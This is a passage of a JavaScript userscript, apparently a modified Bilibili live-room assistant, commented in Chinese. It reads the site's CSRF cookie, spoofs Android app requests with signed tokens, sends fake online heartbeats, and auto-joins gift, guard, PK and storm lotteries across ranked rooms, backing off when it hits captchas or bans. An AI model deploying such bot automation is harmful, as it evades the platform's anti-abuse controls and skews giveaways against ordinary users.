	    document.body.appendChild(iframe);
	    const pFinish = $.Deferred();
	    pFinish.then(() => {
		window[NAME].iframeSet.delete(iframe);
		$(iframe).remove();
	    });
	    const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
	    const pInit = $.Deferred();
	    pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
	    const up = () => {
		CACHE = window[NAME].CACHE;
		Info = window[NAME].Info;
		Essential.Cache.save();
		const pUp = $.Deferred();
		pUp.then(up);
		iframe[NAME].promise.up = pUp;
	    };
	    const pUp = $.Deferred();
	    pUp.then(up);
	    iframe[NAME] = {
		type: type,
		promise: {
		    init: pInit, // 这个Promise在子脚本加载完成时resolve
		    finish: pFinish, // 这个Promise在iframe需要删除时resolve
		    down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
		    up: pUp
		}
	    };
	    window[NAME].iframeSet.add(iframe);
	    DEBUG('createIframe', iframe);
	};

	const Init = () => {
	    try {
		const promiseInit = $.Deferred();
		scriptRuning = true;
		console.log("魔改脚本成功运行...")
		Essential.init().then(() => {
		    console.log("脚本配置加载完毕...")
		    try {
			API = BilibiliAPI;
		    } catch (err) {
			window.toast('BilibiliAPI初始化失败，请检查网络和依赖项访问是否正常！', 'error');
			console.error(`[${NAME}]`, err);
			return p1.reject();
		    }
		    try {
			TokenUtil = BilibiliToken;
			Token = new TokenUtil();
		    } catch (err) {
			TokenUtil = null;
			Token = null;
			window.toast('BilibiliToken 初始化失败，移动端功能可能失效！请检查网络和依赖项访问是否正常！', 'error');
			console.error(`[${NAME}]`, err);
		    }
		    const uniqueCheck = () => {
			const p1 = $.Deferred();
			const t = Date.now() / 1000;
			//console.log('CACHE.unique_check',CACHE.unique_check, Date.now() / 1000);
			if (t - CACHE.unique_check >= 0 && t - CACHE.unique_check <= 60) {
			    // 其他脚本正在运行
			    return p1.reject();
			}
			// 没有其他脚本正在运行
			return p1.resolve();
		    };
		    uniqueCheck().then(() => {
			let timer_unique;
			const uniqueMark = () => {
			    timer_unique = setTimeout(uniqueMark, 2e3);
			    //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
			    CACHE.unique_check = Date.now() / 1000;
			    //console.log('CACHE.uniqueMark',CACHE.unique_check, Date.now() / 1000);
			    Essential.Cache.save();
			};
			window.addEventListener('unload', () => {
			    if (timer_unique) {
				clearTimeout(timer_unique);
				CACHE.unique_check = 0;
				Essential.Cache.save();
			    }
			});
			uniqueMark();
			window.toast('正在初始化脚本...', 'info');
			const InitData = () => {
			    const p = $.Deferred();
			    let initFailed = false;
			    const p2 = $.Deferred();
			    p2.then(() => {
				initFailed = true;
			    });
			    let timer_p2 = setTimeout(() => p2.resolve(), 30e3);
			    let tryCount = 0;
			    runUntilSucceed(() => {
				try {
				    if (initFailed) {
					timer_p2 = undefined;
					window.toast('初始化用户数据、直播间数据超时，请关闭广告拦截插件后重试',
						     'error');
					p.reject();
					return true;
				    }
				    if (!window.BilibiliLive || parseInt(window.BilibiliLive
									 .ROOMID, 10) === 0 || !window.__statisObserver)
					return false;
				    DEBUG('Init: InitData: BilibiliLive', window.BilibiliLive);
				    DEBUG('Init: InitData: __statisObserver',
					  window.__statisObserver);
				    clearTimeout(timer_p2);
				    timer_p2 = undefined;
				    if (parseInt(window.BilibiliLive.UID, 10) ===
					0 || isNaN(parseInt(window.BilibiliLive.UID,
							    10))) {
					if (tryCount > 20) {
					    window.toast('你还没有登录，助手无法使用！',
							 'caution');
					    p.reject();
					    return true;
					} else {
					    return false;
					}
				    }
				    Info.short_id = window.BilibiliLive.SHORT_ROOMID;
				    Info.roomid = window.BilibiliLive.ROOMID;
				    Info.uid = window.BilibiliLive.UID;
				    Info.ruid = window.BilibiliLive.ANCHOR_UID;
				    Info.rnd = window.BilibiliLive.RND;
				    Info.csrf_token = getCookie('bili_jct');
				    Info.visit_id = window.__statisObserver ?
					window.__statisObserver.__visitId : '';
				    API.setCommonArgs(Info.csrf_token, '');
				    const p1 = API.live_user.get_info_in_room(Info.roomid)
				    .then((response) => {
					DEBUG(
					    'InitData: API.live_user.get_info_in_room',
					    response);
					Info.silver = response.data.wallet.silver;
					Info.gold = response.data.wallet.gold;
					Info.uid = response.data.info.uid;
					Info.mobile_verify = response.data.info
					    .mobile_verify;
					Info.identification = response.data
					    .info.identification;
				    });
				    const p2 = API.gift.gift_config().then((
					response) => {
					DEBUG(
					    'InitData: API.gift.gift_config',
					    response);
					if ($.type(response.data) ==
					    "array") {
					    Info.gift_list = response.data;
					} else if ($.type(response.data.list) ==
						   "array") {
					    Info.gift_list = response.data.list;
					} else {
					    Info.gift_list = [];
					    window.toast('直播间礼物数据获取失败',
							 'error');
					    return;
					}
					Info.gift_list.forEach((v, i) => {
					    if (i % 3 === 0) Info.gift_list_str +=
						'<br>';
					    Info.gift_list_str +=
						`${v.id}：${v.name}`;
					    if (i < Info.gift_list.length -
						1) Info.gift_list_str +=
						'，';
					});
				    });
				    $.when(p1, p2).then(() => {
					if (parseInt(window.BilibiliLive.UID,
						     10) === 0 || isNaN(parseInt(
					    window.BilibiliLive.UID,
					    10))) {
					    window.toast('你还没有登录，助手无法使用！',
							 'caution');
					    p.reject();
					    return;
					}
					Essential.DataSync.down();
					p.resolve();
				    }, () => {
					window.toast('初始化用户数据、直播间数据失败',
						     'error');
					p.reject();
				    });
				    return true;
				} catch (err) {
				    if (timer_p2) clearTimeout(timer_p2);
				    window.toast('初始化用户数据、直播间数据时出现异常', 'error');
				    console.error(`[${NAME}]`, err);
				    p.reject();
				    return true;
				}
			    }, 1, 500);
			    return p;
			};
			const InitFunctions = () => {
			    const promiseInitFunctions = $.Deferred();
			    $.when(TreasureBox.init()).then(() => promiseInitFunctions.resolve(),
							    () => promiseInitFunctions.reject());
			    return promiseInitFunctions;
			};
			InitData().then(() => {
			    InitFunctions().then(() => {
				promiseInit.resolve();
			    }, () => promiseInit.reject());
			}, () => promiseInit.reject());
		    }, () => {
			window.toast('有其他直播间页面的脚本正在运行，本页面脚本停止运行', 'caution');
			promiseInit.reject();
		    });
		});
		return promiseInit;
	    } catch (err) {
		window.toast('初始化时出现异常', 'error');
		console.error(`[${NAME}]`, err);
		return $.Deferred().reject();
	    }
	};

	const TopRankTask = {
	    process: async () => {
		try {
		    let roomSet = new Set();
		    let toprank = await delayCall(() => BiliPushUtils.API.LiveRank.topRank(), 1000);
		    let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(0), 1000);
		    let rankList = [toprank, areaRank];
		    let getListRsp = await API.room.getList();
		    if (getListRsp.code == 0 && getListRsp.data) {
			for (let areaInfo of getListRsp.data) {
			    let areaRank = await delayCall(() => BiliPushUtils.API.LiveRank.areaRank(
				areaInfo.id), 1000)
			    rankList.push(areaRank);
			}
		    }
		    for (let rsp of rankList) {
			if (rsp.code == 0 && rsp.data.list) {
			    for (let room of rsp.data.list) {
				roomSet.add(room.roomid)
			    }
			}
		    }
		    for (let roomid of roomSet) {
			await BiliPushUtils.Check.run(roomid);
		    }
		    await delayCall(() => TopRankTask.run(), 300e3);
		} catch (err) {
		    console.error(`[${NAME}]`, err);
		    return delayCall(() => TopRankTask.run());
		}

	    },
	    run: async () => {
		try {
		    let done = true;
		    if (!CONFIG.AUTO_LOTTERY) {
			done = false;
		    }
		    //if (Info.blocked) return $.Deferred().resolve();
		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
			done = false;
		    }
		    if (!BiliPush.connected) {
			done = false;
		    }
		    if (!done) {
			setTimeout(() => TopRankTask.run(), 5000);
			return $.Deferred().resolve();
		    } else {
			await TopRankTask.process();
			return $.Deferred().resolve();
		    }
		} catch (err) {
		    window.toast('[直播小时榜]运行时出现异常，已停止', 'error');
		    console.error(`[${NAME}]`, err);
		    return $.Deferred().reject();
		}
	    }
	}; // Once Run every 1 mins

	const BiliPushUtils = {
	    raffleIdSet: new Set(),
	    guardIdSet: new Set(),
	    pkIdSet: new Set(),
	    stormBlack: false,
	    stormQueue: [],
	    sign: null,
	    msgIgnore: (msg) => {
		if (msg) {
		    let ignoreList = ['操作太快', '稍后再试', '请求太多', '频繁', '繁忙'];
		    for (let ignore of ignoreList) {
			if (msg.indexOf(ignore) > -1) {
			    return true;
			}
		    }
		}
		return false;
	    },
	    clearSet: () => {
		BiliPushUtils.splitSet(BiliPushUtils.raffleIdSet, 1500, 2);
		BiliPushUtils.splitSet(BiliPushUtils.guardIdSet, 200, 2);
		BiliPushUtils.splitSet(BiliPushUtils.pkIdSet, 200, 2);
	    },
	    splitSet: (set, limit, rate = 2) => {
		if (set && set.size > limit) {
		    let end = limit / rate;
		    for (let item of set.entries()) {
			if (item[0] <= end) {
			    set.delete(item[1]);
			}
		    }
		}
	    },
	    up: () => {
		window.parent[NAME].Info = Info;
		window.parent[NAME].CACHE = CACHE;
		if (window.frameElement && window.frameElement[NAME]) {
		    window.frameElement[NAME].promise.up.resolve();
		}
	    },
	    processing: 0,
	    ajax: (setting, roomid) => {
		const p = jQuery.Deferred();
		runUntilSucceed(() => {
		    if (BiliPushUtils.processing > 5) return false;
		    ++BiliPushUtils.processing;
		    return BiliPushUtils._ajax(setting).then((arg1, arg2, arg3) => {
			--BiliPushUtils.processing;
			p.resolve(arg1, arg2, arg3);
			return true;
		    }).catch((arg1, arg2, arg3) => {
			--BiliPushUtils.processing;
			p.reject(arg1, arg2, arg3);
			return true;
		    });
		});
		return p;
	    },
	    _ajax: (setting) => {
		let url = (setting.url.substr(0, 2) === '//' ? '' : '//api.live.bilibili.com/') + setting.url;
		let option = {
		    method: setting.method || "GET",
		    headers: setting.headers || {},
		    credentials: 'include',
		    mode: 'cors'
		};
		if (setting.roomid) {
		    option.referrer = location.protocol + "//" + location.hostname + "/" + setting.roomid;
		}
		if (option.method == "GET") {
		    if (setting.data) {
			url = `${url}?${$.param(setting.data)}`;
		    }
		} else {
		    option.headers["content-type"] = "application/x-www-form-urlencoded";
		    if (setting.data) {
			option.body = $.param(setting.data);
		    }
		}
		return fetch(url, option).then(r => r.json());
	    },
	    ajaxWithCommonArgs: (setting) => {
		if (setting.data) {
		    setting.data.csrf = Info.csrf_token;
		    setting.data.csrf_token = Info.csrf_token;
		}
		return BiliPushUtils.ajax(setting);
	    },
	    corsAjax: (setting) => {
		const p = jQuery.Deferred();
		runUntilSucceed(() => {
		    return new Promise(success => {
			let option = BiliPushUtils._corsAjaxSetting(setting);
			option.onload = (rsp) => {
			    if (rsp.status == 200) {
				p.resolve(rsp.response);
			    } else {
				p.reject(rsp);
			    }
			    success();
			};
			option.onerror = (err) => {
			    p.reject(err);
			    success();
			}
			GM_xmlhttpRequest(option);
		    });
		});
		return p;
	    },
	    _corsAjaxSetting: (setting) => {
		let url = (setting.url.substr(0, 2) === '//' ? location.protocol + '//' : location.protocol +
			   '//api.live.bilibili.com/') + setting.url;
		let option = {
		    url: url,
		    method: setting.method || "GET",
		    headers: setting.headers || {},
		    responseType: 'json',
		};
		if (option.method == "GET") {
		    if (setting.data) {
			url = `${url}?${$.param(setting.data)}`;
		    }
		} else {
		    option.headers["content-type"] = "application/x-www-form-urlencoded";
		    if (setting.data) {
			option.data = $.param(setting.data);
		    }
		}
		return option;
	    },
	    corsAjaxWithCommonArgs: (setting) => {
		if (setting.data) {
		    setting.data.csrf = Info.csrf_token;
		    setting.data.csrf_token = Info.csrf_token;
		}
		return BiliPushUtils.corsAjax(setting);
	    },
	    BaseRoomAction: async (roomid) => {
		//推送开启的话 信任推送数据
		if (BiliPush.connected) {
		    return false;
		} else {
		    const p = $.Deferred();
		    BiliPushUtils.API.room.room_init(roomid).then((response) => {
			DEBUG('BiliPushUtils.BaseRoomAction: BiliPushUtils.API.room.room_init',
			      response);
			if (response.code === 0) {
			    if (response.data.is_hidden || response.data.is_locked || response.data
				.encrypted || response.data.pwd_verified) return p.resolve(true);
			    return p.resolve(false);
			}
			p.reject();
		    }, () => {
			p.reject();
		    }).always(() => {
			BiliPushUtils.API.room.room_entry_action(roomid);
		    });
		    return p;
		}
	    },
	    API: {
		HeartGift: {
		    enter: (data) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/E',
			    data: data,
			    roomid: data.room_id
			});
		    },
		    heart: (data) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: '//live-trace.bilibili.com/xlive/data-interface/v1/x25Kn/X',
			    data: data,
			    roomid: data.room_id
			});
		    }
		},
		LiveRank: {
		    topRank: () => {
			return BiliPushUtils.ajax({
			    url: 'rankdb/v1/Rank2018/getTop?type=master_realtime_hour&type_id=areaid_realtime_hour'
			});
		    },
		    areaRank: (areaid) => {
			return BiliPushUtils.ajax({
			    url: 'rankdb/v1/Rank2018/getTop?&type=master_last_hour&type_id=areaid_hour&page_size=10&area_id=' +
			    areaid
			});
		    }
		},
		Heart: {
		    mobile: () => {
			let appheaders = {};
			let param = "";
			if (Token && TokenUtil) {
			    appheaders = Token.headers
			    if (Info.appToken) {
				param = TokenUtil.signQuery(KeySign.sort({
				    access_key: Info.appToken.access_token,
				    appkey: TokenUtil.appKey,
				    actionKey: 'appkey',
				    build: 5561000,
				    channel: 'bili',
				    device: 'android',
				    mobi_app: 'android',
				    platform: 'android',
				}));
			    }
			}
			return BiliPushUtils.corsAjax({
			    method: 'POST',
			    url: `heartbeat/v1/OnLine/mobileOnline?${param}`,
			    data: {
				'roomid': 21438956,
				'scale': 'xxhdpi'
			    },
			    headers: appheaders
			});
		    },
		    mobile_login: () => {
			let param = TokenUtil.signLoginQuery(KeySign.sort({
			    access_key: Info.appToken.access_token
			}));
			return BiliPushUtils.corsAjax({
			    method: 'GET',
			    url: `//passport.bilibili.com/x/passport-login/oauth2/info?${param}`,
			    headers: Token.headers
			});
		    },
		    mobile_info: () => {
			let param = TokenUtil.signQuery(KeySign.sort({
			    access_key: Info.appToken.access_token,
			    room_id: 21438956,
			    appkey: TokenUtil.appKey,
			    actionKey: 'appkey',
			    build: 5561000,
			    channel: 'bili',
			    device: 'android',
			    mobi_app: 'android',
			    platform: 'android',
			}));
			return BiliPushUtils.corsAjax({
			    method: 'GET',
			    url: `xlive/app-room/v1/index/getInfoByUser?${param}`,
			    headers: Token.headers
			});
		    },
		    pc: (success) => {
			return BiliPushUtils.corsAjaxWithCommonArgs({
			    method: 'POST',
			    url: 'User/userOnlineHeart',
			    data: {}
			});
		    }
		},
		Check: {
		    check: (roomid) => {
			return BiliPushUtils.ajax({
			    url: 'xlive/lottery-interface/v1/lottery/Check?roomid=' + roomid,
			    roomid: roomid
			});
		    },
		},
		Storm: {
		    check: (roomid) => {
			// 检查是否有节奏风暴
			return BiliPushUtils.ajax({
			    url: 'xlive/lottery-interface/v1/storm/Check?roomid=' + roomid,
			    roomid: roomid
			});
		    },
		    join: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
			// 参加节奏风暴
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v1/storm/Join',
			    data: {
				id: id,
				color: color,
				captcha_token: captcha_token,
				captcha_phrase: captcha_phrase,
				roomid: roomid
			    },
			    roomid: roomid
			});
		    },
		    join_ex: (id, roomid, captcha_token = "", captcha_phrase = "", color = 15937617) => {
			// 参加节奏风暴
			let param = TokenUtil.signQuery(KeySign.sort({
			    id: id,
			    access_key: Info.appToken.access_token,
			    appkey: TokenUtil.appKey,
			    actionKey: 'appkey',
			    build: 5561000,
			    channel: 'bili',
			    device: 'android',
			    mobi_app: 'android',
			    platform: 'android',
			}));
			return BiliPushUtils.corsAjaxWithCommonArgs({
			    method: 'POST',
			    url: `xlive/lottery-interface/v1/storm/Join?${param}`,
			    headers: Token.headers,
			    roomid: roomid
			});
		    }
		},
		Guard: {
		    join: (roomid, id, type = 'guard') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v3/guard/join',
			    data: {
				roomid: roomid,
				id: id,
				type: type
			    },
			    roomid: roomid
			});
		    },
		},
		Gift: {
		    join: (roomid, id, type = 'small_tv') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v5/smalltv/join',
			    data: {
				roomid: roomid,
				id: id,
				type: type
			    },
			    roomid: roomid
			});
		    }
		},
		room: {
		    room_entry_action: (room_id, platform = 'pc') => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'room/v1/Room/room_entry_action',
			    data: {
				room_id: room_id,
				platform: platform
			    },
			    roomid: room_id
			});
		    },
		    room_init: (id) => {
			return BiliPushUtils.ajax({
			    url: 'room/v1/Room/room_init?id=' + id,
			    roomid: id
			});
		    },
		},
		Pk: {
		    join: (roomid, id) => {
			return BiliPushUtils.ajaxWithCommonArgs({
			    method: 'POST',
			    url: 'xlive/lottery-interface/v1/pk/join',
			    data: {
				roomid: roomid,
				id: id
			    },
			    roomid: roomid
			});
		    }
		}
	    },
	    Check: {
		roomSet: new Set(),
		roomCacheSet: new Set(),
		sleepTimeRange: [],
		sleepTimeRangeBuild: () => {
		    const value = CONFIG.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
		    let time_range = [];
		    let options = value.split(',');
		    for (let timerangstr of options) {
			let time_tmp = [];
			let baseTimes = timerangstr.split('-');
			if (baseTimes && baseTimes.length == 2) {
			    let timeArray1 = baseTimes[0].split(':');
			    let timeArray2 = baseTimes[1].split(':');
			    time_range.push({
				bh: parseInt(timeArray1[0]),
				bm: parseInt(timeArray1[1]),
				eh: parseInt(timeArray2[0]),
				em: parseInt(timeArray2[1]),
				str: timerangstr
			    });
			}
		    }
		    BiliPushUtils.Check.sleepTimeRange = time_range;
		    return time_range;
		},
		checkSleep: () => {
		    let srange = BiliPushUtils.Check.sleepTimeRange;
		    const now = new Date();

		    function dayTime(hours, mins) {
			return new Date().setHours(hours, mins, 0, 0)
		    }
		    let f = srange.find(it => dayTime(it.bh, it.bm) <= now && now <= dayTime(it.eh, it.em));
		    return f;
		},
		start: async () => {
		    try {
			//var tmp = Array.from(BiliPushUtils.Check.roomSet);
			//检查是否休眠
			if (!BiliPushUtils.Check.checkSleep()) {
			    BiliPushUtils.Check.roomCacheSet.clear();
			    for (let room_id of BiliPushUtils.Check.roomSet) {
				if (BiliPushUtils.Check.checkSleep()) {
				    break;
				}
				if (BiliPushUtils.Check.roomSet.has(room_id)) {
				    BiliPushUtils.Check.roomSet.delete(room_id);
				    await BiliPushUtils.Check.process(room_id);
				    await delayCall(() => {}, 300);
				}
			    }
			}
			setTimeout(() => BiliPushUtils.Check.start(), 1000);
			return $.Deferred().resolve();
		    } catch (e) {
			setTimeout(() => BiliPushUtils.Check.start(), 1000);
			return $.Deferred().reject();
		    }
		},
		run: (roomid) => {
		    if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
		    //if (Info.blocked) return $.Deferred().resolve();
		    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
			return $.Deferred().resolve();
		    let sleep = BiliPushUtils.Check.checkSleep();
		    if (sleep) {
			console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
			return $.Deferred().resolve();
		    }
		    if (!BiliPushUtils.Check.roomCacheSet.has(roomid)) {
			BiliPushUtils.Check.roomCacheSet.add(roomid);
			BiliPushUtils.Check.roomSet.add(roomid);
		    }
		    return $.Deferred().resolve();
		},
		process: (roomid) => {
		    try {
			if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD)
			    return $.Deferred().resolve();
			let sleep = BiliPushUtils.Check.checkSleep();
			if (sleep) {
			    console.log(`自动休眠 ${sleep.str} 跳过抽奖检测,roomid=${roomid}`);
			    return $.Deferred().resolve();
			}
			BiliPushUtils.Check.roomSet.delete(roomid);
			return BiliPushUtils.BaseRoomAction(roomid).then((fishing) => {
			    if (!fishing) {
				return BiliPushUtils.API.Check.check(roomid).then((response) => {
				    DEBUG(
					'BiliPushUtils.Check.run: BiliPushUtils.API.Check.check',
					response);
				    if (response.code === 0) {
					var data = response.data;
					if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) {
					    if (data.gift && data.gift.length > 0) {
						BiliPushUtils.Gift.join(roomid, data.gift);
					    }
					}
					if (CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
					    if (data.guard && data.guard.length > 0) {
						BiliPushUtils.Guard.join(roomid, data.guard);
					    }
					}
					if (CONFIG.AUTO_LOTTERY_CONFIG.PK_AWARD) {
					    if (data.pk && data.pk.length > 0) {
						BiliPushUtils.Pk.join(roomid, data.pk);
					    }
					}
					return $.Deferred().resolve();
				    } else {
					window.toast(
					    `[自动抽奖][查询](roomid=${roomid})${response.msg}`,
					    'caution');
				    }
				}, () => {
				    window.toast(`[自动抽奖][查询]检查礼物(${roomid})失败，请检查网络`,
						 'error');
				    return delayCall(() => BiliPushUtils.Check.run(roomid));
				});
			    }
			}, () => {
			    window.toast(`[自动抽奖][查询]检查直播间(${roomid})失败，请检查网络`, 'error');
			    return delayCall(() => BiliPushUtils.Check.run(roomid), 1e3);
			});
		    } catch (err) {
			window.toast('[自动抽奖][查询]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    },
	    Storm: {
		check: (id) => {
		    return BiliPushUtils.stormQueue.indexOf(id) > -1;
		},
		append: (id) => {
		    BiliPushUtils.stormQueue.push(id);
		    if (BiliPushUtils.stormQueue.length > CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE) {
			BiliPushUtils.stormQueue.shift();
		    }
		},
		over: (id) => {
		    var index = BiliPushUtils.stormQueue.indexOf(id);
		    if (index > -1) {
			BiliPushUtils.stormQueue.splice(id, 1);
		    }
		},
		run: (roomid) => {
		    try {
			if (!CONFIG.AUTO_LOTTERY) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			if (BiliPushUtils.stormBlack) return $.Deferred().resolve();
			if (!CONFIG.AUTO_LOTTERY_CONFIG.STORM) return $.Deferred().resolve();
			let sleep = BiliPushUtils.Check.checkSleep();
			if (sleep) {
			    console.log(`自动休眠 ${sleep.str} 跳过风暴检测,roomid=${roomid}`);
			    return $.Deferred().resolve();
			}
			return BiliPushUtils.API.Storm.check(roomid).then((response) => {
			    DEBUG('BiliPushUtils.Storm.run: BiliPushUtils.API.Storm.check',
				  response);
			    if (response.code === 0) {
				var data = response.data;
				BiliPushUtils.Storm.join(data.id, data.roomid, Math.round(new Date()
											  .getTime() / 1000) + data.time);
				return $.Deferred().resolve();
			    } else {
				window.toast(`[自动抽奖][节奏风暴](roomid=${roomid})${response.msg}`,
					     'caution');
			    }
			}, () => {
			    window.toast(`[自动抽奖][节奏风暴]检查直播间(${roomid})失败，请检查网络`, 'error');
			    //return delayCall(() => BiliPushUtils.Storm.run(roomid));
			});
		    } catch (err) {
			window.toast('[自动抽奖][节奏风暴]运行时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		},
		join: (id, roomid, endtime) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    var tid = Math.round(id / 1000000);
		    if (BiliPushUtils.guardIdSet.has(tid)) return $.Deferred().resolve();
		    BiliPushUtils.guardIdSet.add(tid);
		    if (BiliPushUtils.Storm.check(id)) {
			return;
		    }
		    BiliPushUtils.Storm.append(id);
		    var stormInterval = 0;
		    if (endtime <= 0) {
			endtime = Math.round(new Date().getTime() / 1000) + 90;
		    }
		    var count = 0;
		    window.toast(`[自动抽奖][节奏风暴]尝试抽奖(roomid=${roomid},id=${id})`, 'success');
		    async function process() {
			try {
			    if (!BiliPushUtils.Storm.check(id)) {
				clearInterval(stormInterval);
				return;
			    }
			    var timenow = Math.round(new Date().getTime() / 1000);
			    //console.log('stormdebug:',id,count,timenow,endtime);
			    if (timenow > endtime && endtime > 0) {
				BiliPushUtils.Storm.over(id);
				clearInterval(stormInterval);
				//window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})过期。\r\n尝试次数:${count}`, 'caution');
				return;
			    }
			    count++;
			    if (count > CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT &&
				CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT > 0) {
				BiliPushUtils.Storm.over(id);
				clearInterval(stormInterval);
				window.toast(
				    `[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})到达尝试次数。\r\n尝试次数:${count},距离到期:${endtime-timenow}s`,
				    'caution');
				return;
			    }
			    let response;
			    try {
				if (Token && TokenUtil && Info.appToken) {
				    response = await BiliPushUtils.API.Storm.join_ex(id, roomid);
				} else {
				    response = await BiliPushUtils.API.Storm.join(id, roomid);
				}
				DEBUG('BiliPushUtils.Storm.join: BiliPushUtils.API.Storm.join',
				      response);
				if (response.code) {
				    if (response.msg.indexOf("领取") != -1) {
					BiliPushUtils.Storm.over(id);
					clearInterval(stormInterval);
					window.toast(
					    `[自动抽奖][节奏风暴]领取(roomid=${roomid},id=${id})成功,${response.msg}\r\n尝试次数:${count}`,
					    'success');
					return;
				    }
				    if (response.msg.indexOf("验证码") != -1) {
					BiliPushUtils.Storm.over(id);
					clearInterval(stormInterval);
					BiliPushUtils.stormBlack = true;
					window.toast(
					    `[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})失败,疑似账号不支持,${response.msg}`,
					    'caution');
					return;
				    }
				    if (response.data && response.data.length == 0 && response.msg.indexOf(
					"下次要更快一点") != -1) {
					BiliPushUtils.Storm.over(id);
					window.toast(
					    `[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})疑似风暴黑屋,终止！`,
					    'error');
					clearInterval(stormInterval);
					BiliPushUtils.stormBlack = true;
					setTimeout(() => {
					    BiliPushUtils.stormBlack = false;
					}, 3600 * 1000);
					return;
				    }
				    if (response.msg.indexOf("下次要更快一点") == -1) {
					clearInterval(stormInterval);
					return;
				    }
				    //setTimeout(()=>process(),CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT);
				} else {
				    BiliPushUtils.Storm.over(id);
				    Statistics.appendGift(response.data.gift_name, response.data.gift_num);
				    window.toast(
					`[自动抽奖][节奏风暴]领取(roomid=${roomid},id=${id})成功,${response.data.gift_name+"x"+response.data.gift_num}\r\n${response.data.mobile_content}\r\n尝试次数:${count}`,
					'success');
				    clearInterval(stormInterval);
				    return;
				}
			    } catch (e) {
				BiliPushUtils.Storm.over(id);
				window.toast(
				    `[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})疑似触发风控,终止！\r\n尝试次数:${count}`,
				    'error');
				console.error(e);
				clearInterval(stormInterval);
				return;
			    }
			} catch (e) {
			    BiliPushUtils.Storm.over(id);
			    window.toast(`[自动抽奖][节奏风暴]抽奖(roomid=${roomid},id=${id})抽奖异常,终止！`, 'error');
			    console.error(e);
			    clearInterval(stormInterval);
			    return;
			}
		    }
		    //setTimeout(()=>process(),1);
		    stormInterval = setInterval(() => process(), CONFIG.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT);
		    return $.Deferred().resolve();
		}
	    },
	    Pk: {
		run: (roomid) => (BiliPushUtils.Check.run(roomid)),
		join: async (roomid, ids) => {
		    try {
			//console.log(`Pk.join`,roomid,ids,i)
			if (!ids) return $.Deferred().resolve();
			//if (Info.blocked) return $.Deferred().resolve();
			for (let obj of ids) {
			    // id过滤，防止重复参加
			    var id = parseInt(obj.id, 10);
			    if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
			    BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
			    await BiliPushUtils.Pk._join(roomid, obj.id);
			}
			return $.Deferred().resolve();
		    } catch (e) {
			await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
		    }
		},
		_join: (roomid, id) => {
		    //if (Info.blocked) return $.Deferred().resolve();
		    roomid = parseInt(roomid, 10);
		    id = parseInt(id, 10);
		    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
		    RafflePorcess.append(roomid, id);
		    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
		    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
			DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
			if (response.code === 0) {
			    try {
				var giftInfo = response.data.award_text.split('X');
				Statistics.appendGift(giftInfo[0], giftInfo[1] - 0, response.data
						      .award_ex_time);
			    } catch (e) {}
			    window.toast(
				`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`,
				'success');
			} else if (response.msg.indexOf('拒绝') > -1) {
			    //Info.blocked = true;
			    //BiliPushUtils.up();
			    //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
			} else if (BiliPushUtils.msgIgnore(response.msg)) {
